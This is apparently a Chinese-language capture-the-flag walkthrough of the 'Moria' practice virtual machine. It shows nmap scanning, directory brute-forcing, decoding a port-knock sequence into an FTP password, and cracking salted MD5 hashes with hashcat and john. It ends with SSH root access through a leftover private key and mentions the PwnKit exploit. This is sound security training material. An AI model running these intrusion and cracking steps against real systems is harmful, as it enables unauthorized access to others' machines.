VMware双击打开，默认nat模式即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.215)

--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.215 -p- -A

21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Gates of Moria


3、web信息收集
访问：
http://192.168.253.215/

图像显示的是魔戒，这是《指环王》电影中的矮人城市，打开门有一个谜！
可以看到有Moria，谷歌的翻译是说：Mellon必须是密码之一


目录爆破：
dirb http://192.168.253.215/
http://192.168.253.215/w/
访问：
http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/   ---一直往下点回显
"Eru! Save us!"   ---艾尔！救救我们！
刷新发现，每次刷新都会发现内容变化了，这应该是个随机文本！
1. Balin: "Be quiet, the Balrog will hear you!" 
2. Nain:"Will the human get the message?" 
"Knock knock" 
3. Dain:"Is that human deaf? Why is it not listening?" 
4. "We will die here.." 
5. Ori:"Will anyone hear us?" 
6. Fundin:"That human will never save us!" 
Oin:"Stop knocking!" 


4、目录文件模糊测试

dirb http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/ -X .txt .img .html
http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/random.txt

找到一个名为random.txt的文件，果然隐藏了文件！
访问：
-------
Balin: "Be quiet, the Balrog will hear you!"
Oin:"Stop knocking!"
Ori:"Will anyone hear us?"
Fundin:"That human will never save us!"
Nain:"Will the human get the message?"
"Eru! Save us!"
"We will die here.."
"Is this the end?"
"Knock knock"
"Too loud!"
Maeglin:"The Balrog is not around, hurry!"
Telchar to Thrain:"That human is slow, don't give up yet"
Dain:"Is that human deaf? Why is it not listening?"
-------
这里面有很多大写开头得名称：Balin，Oin，Ori，Fundin，Nain，Eru，Balrog
都有可能是用户名！还有就是出现了一个词，knocking这是敲端口！


5、流量抓包分析

我使用Wireshark抓包，刷新了下页面：http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/random.txt

tcp.srcport == 1337
发现了一些敲门事件！

或者用：
tcpdump -n -i eth0 dst 192.168.253.215

------
03:33:00.835935 IP 192.168.253.138.77 > 192.168.253.215.1337: Flags [R.], seq 0, ack 1583627909, win 0, length 0
03:33:00.841922 IP 192.168.253.138.101 > 192.168.253.215.1337: Flags [R.], seq 0, ack 1583627909, win 0, length 0
03:33:00.847499 IP 192.168.253.138.108 > 192.168.253.215.1337: Flags [R.], seq 0, ack 1583627909, win 0, length 0
03:33:01.851934 IP 192.168.253.138.108 > 192.168.253.215.1337: Flags [R.], seq 0, ack 2911034179, win 0, length 0
03:33:01.853970 IP 192.168.253.138.111 > 192.168.253.215.1337: Flags [R.], seq 0, ack 199694791, win 0, length 0
03:33:01.855682 IP 192.168.253.138.110 > 192.168.253.215.1337: Flags [R.], seq 0, ack 199694791, win 0, length 0
03:33:01.857295 IP 192.168.253.138.54 > 192.168.253.215.1337: Flags [R.], seq 0, ack 199694791, win 0, length 0
03:33:01.858927 IP 192.168.253.138.57 > 192.168.253.215.1337: Flags [R.], seq 0, ack 199694791, win 0, length 0
------
这边我将77 101 108 108 111 110 54 57端口按顺序进行敲震！

knock -v 192.168.253.215 77 101 108 108 111 110 54 57
敲完后，nmap扫描并没发现什么东西!!


6、ASCII解码

发现77 101 108 108 111 110 54 57 会不会是和我项目三十一当时做得ASCII是这里面得值：

十进制转码：
通过对ASCII表进行翻译，发现：Mellon69


在端口80的索引页上的门的图像中就有提到，Mellon是Elvish的朋友！

在访问：http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/random.txt
The Balrog is not around, hurry有这一句，让我们别吵，Balrog会听到我们的声音！

ssh无法访问！但是FTP进去了！


7、FTP信息枚举

ftp 192.168.253.215
Balrog
Mellon69

200 PORT command successful. Consider using PASV.  ---提示被动模式

进入/var/www/html目录枚举，发现存在隐藏目录：
QlVraKW4fbIkXau9zkAPNGzviT3UKntl

底下存在：index.php

访问发现：
http://192.168.253.215/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/


8、web信息深入枚举

访问发现：
http://192.168.253.215/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/

静态页面提示：
MD5(MD5(Password).Salt)
盐（Salt），在密码学中，是指在散列之前将散列内容（例如：密码）的任意固定位置插入特定的字符串。

存在九个用户和密匙信息！

静态页面还提示：
6MAp84
bQkChe
HnqeN4
e5ad5s
g9Wxv7
HCCsxP
cC5nTr
h8spZR
tb9AWe

排序对应：
Balin:c2d8960157fc8540f6d5d66594e165e0:6MAp84
Oin:727a279d913fba677c490102b135e51e:bQkChe
Ori:8c3c3152a5c64ffb683d78efc3520114:HnqeN4
Maeglin:6ba94d6322f53f30aca4f34960203703:e5ad5s
Fundin:c789ec9fae1cd07adfc02930a39486a1:g9Wxv7
Nain:fec21f5c7dcf8e5e54537cfda92df5fe:HCCsxP
Dain:6a113db1fd25c5501ec3a5936d817c29:cC5nTr
Thrain:7db5040c351237e8332bfbba757a1019:h8spZR
Telchar:dd272382909a4f51163c77da6356cc6f:tb9AWe



9、暴力破解MD5加盐

1）hashcat爆破

c2d8960157fc8540f6d5d66594e165e0:6MAp84
727a279d913fba677c490102b135e51e:bQkChe
8c3c3152a5c64ffb683d78efc3520114:HnqeN4
6ba94d6322f53f30aca4f34960203703:e5ad5s
c789ec9fae1cd07adfc02930a39486a1:g9Wxv7
fec21f5c7dcf8e5e54537cfda92df5fe:HCCsxP
6a113db1fd25c5501ec3a5936d817c29:cC5nTr
7db5040c351237e8332bfbba757a1019:h8spZR
dd272382909a4f51163c77da6356cc6f:tb9AWe
用户文本加入user.txt

hashcat -m 2611 --force hash.txt /root/Desktop/rockyou.txt

成功爆破：
dd272382909a4f51163c77da6356cc6f:tb9AWe:magic    
727a279d913fba677c490102b135e51e:bQkChe:rainbow  
6ba94d6322f53f30aca4f34960203703:e5ad5s:fuckoff  
8c3c3152a5c64ffb683d78efc3520114:HnqeN4:spanky   
6a113db1fd25c5501ec3a5936d817c29:cC5nTr:abcdef   
c2d8960157fc8540f6d5d66594e165e0:6MAp84:flower   
7db5040c351237e8332bfbba757a1019:h8spZR:darkness 
fec21f5c7dcf8e5e54537cfda92df5fe:HCCsxP:warrior  
c789ec9fae1cd07adfc02930a39486a1:g9Wxv7:hunter2

Balin:flower
Oin:rainbow
Ori:spanky
Maeglin:fuckoff
Fundin:hunter2
Nain:warrior
Dain:abcdef
Thrain:darkness
Telchar:magic


2）john爆破

https://www.secpulse.com/archives/158025.html

MD5(MD5(Password).Salt)

john --list=subformats
Format = dynamic_6   type = dynamic_6: md5(md5($p).$s)

john --format=dynamic_6 hash   ----这个方法不行！通过底层研究！！


c2d8960157fc8540f6d5d66594e165e0$6MAp84
727a279d913fba677c490102b135e51e$bQkChe
8c3c3152a5c64ffb683d78efc3520114$HnqeN4
6ba94d6322f53f30aca4f34960203703$e5ad5s
c789ec9fae1cd07adfc02930a39486a1$g9Wxv7
fec21f5c7dcf8e5e54537cfda92df5fe$HCCsxP
6a113db1fd25c5501ec3a5936d817c29$cC5nTr
7db5040c351237e8332bfbba757a1019$h8spZR
dd272382909a4f51163c77da6356cc6f$tb9AWe

john --form=dynamic='md5(md5($p).$s)' --wordlist=/root/Desktop/rockyou.txt test

Using default input encoding: UTF-8
Loaded 9 password hashes with 9 different salts (dynamic=md5(md5($p).$s) [128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
flower           (?)
warrior          (?)
spanky           (?)
rainbow          (?)
abcdef           (?)
fuckoff          (?)
darkness         (?)
magic            (?)
hunter2          (?)
9g 0:00:00:00 DONE (2022-04-08 05:15) 900.0g/s 1176Kp/s 2688Kc/s 2688KC/s chulita..727272
Use the "--show --format=dynamic=md5(md5($p).$s)" options to display all of the cracked passwords reliably
Session completeda


10、内部信息枚举


ssh Ori@192.168.253.215
spanky


linpeas：
Possible private SSH keys were found!
/home/Ori/.ssh/id_rsa

Searching root files in home dirs (limit 30)
/home/
/home/Ori/poem.txt
/root/


cat /home/Ori/poem.txt  ---发现了一首诗

Ho! Ho! Ho! to the bottle I go
To heal my heart and drown my woe.
Rain may fall and wind may blow,
And many miles be still to go,
But under a tall tree I will lie,
And let the clouds go sailing by. 

PS: Moria will not fall!


11、ssh rsa

/home/Ori/.ssh/id_rsa   ---在.ssh目录下发现了id_rsa

cat known_hosts 
127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=



ssh root@127.0.0.1 -i id_rsa
Last login: Fri Apr 28 18:01:27 2017
[root@Moria ~]# id
uid=0(root) gid=0(root) 组=0(root)

直接获得root权限！


PwnKit-Exploit-main-2021-4034  提权


















